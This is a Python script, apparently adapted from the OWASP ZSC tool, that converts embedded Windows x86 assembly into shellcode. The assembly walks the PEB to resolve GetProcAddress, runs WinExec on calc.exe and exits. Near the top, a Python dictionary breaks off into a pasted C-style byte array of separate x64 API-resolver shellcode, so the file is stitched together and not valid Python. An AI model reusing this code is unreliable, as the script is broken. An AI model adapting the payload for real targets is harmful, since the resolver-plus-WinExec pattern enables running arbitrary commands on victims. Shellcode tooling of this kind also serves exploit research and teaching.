#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''

import sys
sys.path.insert(0, 'C:\\Users\\Nikhil\Desktop\\vagrant\\OWASP-ZSC')
# import core
import binascii
from core import stack
from core import color
from core.alert import info
from core.compatible import version
_version = version()
replace_values_static = 
	{
	'push rbx':'53',
	'push rdi' :'57',


  /* 0001 */ "\x56"                         /* push rsi                        */
  /* 0002 */ "\x57"                         /* push rdi                        */
  /* 0003 */ "\x55"                         /* push rbp                        */
  /* 0004 */ "\x83\xec\x28"                 /* sub esp, 0x28                   */
  /* 0007 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0009 */ "\x40\x92"                     /* xchg edx, eax                   */
  /* 000B */ "\x74\x19"                     /* jz 0x26                         */
  /* 000D */ "\x8b\x4c\x24\x3c"             /* mov ecx, [rsp+0x3c]             */
  /* 0011 */ "\x51"                         /* push rcx                        */
  /* 0012 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:rdx+0x2f]          */
  /* 0016 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 0019 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 001C */ "\xad"                         /* lodsd                           */
  /* 001D */ "\x8b\x30"                     /* mov esi, [rax]                  */
  /* 001F */ "\x8b\x7e\x18"                 /* mov edi, [rsi+0x18]             */
  /* 0022 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 0024 */ "\xeb\x17"                     /* jmp 0x3d                        */
  /* 0026 */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 0028 */ "\x65\x48\x8b\x32"             /* mov rsi, [gs:rdx]               */
  /* 002C */ "\x48\x8b\x76\x18"             /* mov rsi, [rsi+0x18]             */
  /* 0030 */ "\x48\x8b\x76\x10"             /* mov rsi, [rsi+0x10]             */
  /* 0034 */ "\x48\xad"                     /* lodsq                           */
  /* 0036 */ "\x48\x8b\x30"                 /* mov rsi, [rax]                  */
  /* 0039 */ "\x48\x8b\x7e\x30"             /* mov rdi, [rsi+0x30]             */
  /* 003D */ "\x03\x57\x3c"                 /* add edx, [rdi+0x3c]             */
  /* 0040 */ "\x8b\x5c\x17\x28"             /* mov ebx, [rdi+rdx+0x28]         */
  /* 0044 */ "\x8b\x74\x1f\x20"             /* mov esi, [rdi+rbx+0x20]         */
  /* 0048 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 004B */ "\x8b\x54\x1f\x24"             /* mov edx, [rdi+rbx+0x24]         */
  /* 004F */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [rdi+rdx]       */
  /* 0053 */ "\x48\x8d\x52\x02"             /* lea rdx, [rdx+0x2]              */
  /* 0057 */ "\xad"                         /* lodsd                           */
  /* 0058 */ "\x81\x3c\x07\x4c\x6f\x61\x64" /* cmp dword [rdi+rax], 0x64616f4c */
  /* 005F */ "\x75\xee"                     /* jnz 0x4f                        */
  /* 0061 */ "\x80\x7c\x07\x0b\x41"         /* cmp byte [rdi+rax+0xb], 0x41    */
  /* 0066 */ "\x75\xe7"                     /* jnz 0x4f                        */
  /* 0068 */ "\x8b\x74\x1f\x1c"             /* mov esi, [rdi+rbx+0x1c]         */
  /* 006C */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 006F */ "\x8b\x34\xae"                 /* mov esi, [rsi+rbp*4]            */
  /* 0072 */ "\x48\x01\xf7"                 /* add rdi, rsi                    */
  /* 0075 */ "\xff\xd7"                     /* call rdi                        */
  /* 0077 */ "\x48\x83\xc4\x28"             /* add rsp, 0x28                   */
  /* 007B */ "\x5d"                         /* pop rbp                         */
  /* 007C */ "\x5f"                         /* pop rdi                         */
  /* 007D */ "\x5e"                         /* pop rsi                         */
  /* 007E */ "\x5b"                         /* pop rbx                         */
  /* 007F */ "\xc3"                         /* ret                             */
}



def convert(shellcode):
	shellcode = shellcode.replace('\n\n','\n').replace('\n\n','\n').replace('    ',' ').replace('   ',' ').replace('	',' ')
	for data in replace_values_static:
		shellcode = shellcode.replace(data,replace_values_static[data])

	new_shellcode = shellcode.rsplit('\n')
	# return new_shellcode
	last = 0
	for line in new_shellcode:
		if 'push $0x' in line:
			if len(line) is 15:
				if _version is 2:
					rep = str('68') + stack.st(str(binascii.a2b_hex(str('0') + str(line.rsplit('$0x')[1]))))
				if _version is 3:
					rep = str('68') + stack.st(str(binascii.a2b_hex(str('0') + line.rsplit('$0x')[1].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)
			if len(line) is 16:
				if _version is 2:
					rep = str('68') + stack.st(str(binascii.a2b_hex(str(line.rsplit('$0x')[1]))))
				if _version is 3:
					rep = str('68') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)

		if 'mov $0x' in line:
			if '%ecx' in line.rsplit(',')[1]:
				if _version is 2:
					rep = str('b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)

		if 'mov 0x' in line:
			if '%eax' in line.rsplit(',')[0] and '%eax' in line.rsplit(',')[1]:
				rep = str('8b 40') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%eax' in line.rsplit(',')[0] and '%esi' in line.rsplit(',')[1]:
				rep = str('8b 70') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%eax' in line.rsplit(',')[0] and '%ebx' in line.rsplit(',')[1]:
				rep = str('8b 58') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%ebx' in line.rsplit(',')[0] and '%edx' in line.rsplit(',')[1]:
				rep = str('8b 53') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%edx' in line.rsplit(',')[0] and '%edx' in line.rsplit(',')[1]:
				rep = str('8b 52') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)
			if '%edx' in line.rsplit(',')[0] and '%esi' in line.rsplit(',')[1]:
				rep = str('8b 72') + stack.toHex(line.rsplit('0x')[1].rsplit('(')[0])
				shellcode = shellcode.replace(line,rep)

		if 'mov $0x' in line and len(line.rsplit('$0x')[1].rsplit(',')[0]) == 4:
			if '%cx' in line:
				if _version is 2:
					rep = str('66 b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('66 b9') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)
			if '%dx' in line:
				if _version is 2:
					rep = str('66 ba') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('66 ba') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)

		if 'add' in line:
			if '$0x' in line:
				if '%esp' in line.rsplit(',')[1]:
					if _version is 2:
						rep = str('83 c4') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit('$0x')[1].rsplit(',')[0]))))
					if _version is 3:
						rep = str('83 c4') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit('$0x')[1].rsplit(',')[0]).encode('latin-1')).decode('latin-1')))
					shellcode = shellcode.replace(line,rep)

		if 'cmpl' in line:
			if '(%eax)' == line.rsplit(',')[1]:
				if _version is 2:
					rep = str('81 38') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
				if _version is 3:
					rep = str('81 38') + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
				shellcode = shellcode.replace(line,rep)
			if '0x' in line.rsplit(',')[1]:
				if '%eax' in line:
					if _version is 2:
						rep = str('81 78') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit(',0x')[1].rsplit('(')[0])))) + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0])))
					if _version is 3:
						rep = str('81 78') + stack.st(str(binascii.a2b_hex(stack.toHex(line.rsplit(',0x')[1].rsplit('(')[0]).encode('latin-1')).decode('latin-1'))) + stack.st(str(binascii.a2b_hex(line.rsplit('$0x')[1].rsplit(',')[0].encode('latin-1')).decode('latin-1')))
					shellcode = shellcode.replace(line,rep)

		if 'jne' in line:
			rep = str('75') + hex(int('f4', 16) - last*9)[2:]
			shellcode = shellcode.replace(line,rep,1)
			last += 1
	# this line basically adds \x before all the shellcodes. 
	shellcode = stack.shellcoder(shellcode.replace('\n','').replace(' ',''))
	return shellcode

assembly = '''xor    %ecx,%ecx
mov    %fs:0x30(%ecx),%eax
mov    0xc(%eax),%eax
mov    0x14(%eax),%esi
lods   %ds:(%esi),%eax
xchg   %eax,%esi
lods   %ds:(%esi),%eax
mov    0x10(%eax),%ebx
mov    0x3c(%ebx),%edx
add    %ebx,%edx
mov    0x78(%edx),%edx
add    %ebx,%edx
mov    0x20(%edx),%esi
add    %ebx,%esi
xor    %ecx,%ecx
inc    %ecx
lods   %ds:(%esi),%eax
add    %ebx,%eax
cmpl   $0x50746547,(%eax)
jne    23 <.text+0x23>
cmpl   $0x41636f72,0x4(%eax)
jne    23 <.text+0x23>
cmpl   $0x65726464,0x8(%eax)
jne    23 <.text+0x23>
mov    0x24(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,2),%cx
dec    %ecx
mov    0x1c(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,4),%edx
add    %ebx,%edx
push   %ebx
push   %edx
xor    %ecx,%ecx
push   %ecx
mov    $0x61636578,%ecx
push   %ecx
subl   $0x61,0x3(%esp)
push   $0x456e6957
push   %esp
push   %ebx
call   *%edx
add    $0x8,%esp
pop    %ecx
push   %eax
xor    %ecx,%ecx
push   %ecx
push $0x6578652e
push $0x636c6163

xor    %ebx,%ebx
mov    %esp,%ebx
xor    %ecx,%ecx
inc    %ecx
push   %ecx
push   %ebx
call   *%eax
add    $0x10,%esp
pop    %edx
pop    %ebx
xor    %ecx,%ecx
mov    $0x61737365,%ecx
push   %ecx
subl   $0x61,0x3(%esp)
push   $0x636f7250
push   $0x74697845
push   %esp
push   %ebx
call   *%edx
xor    %ecx,%ecx
push   %ecx
call   *%eax
'''
print(convert(assembly))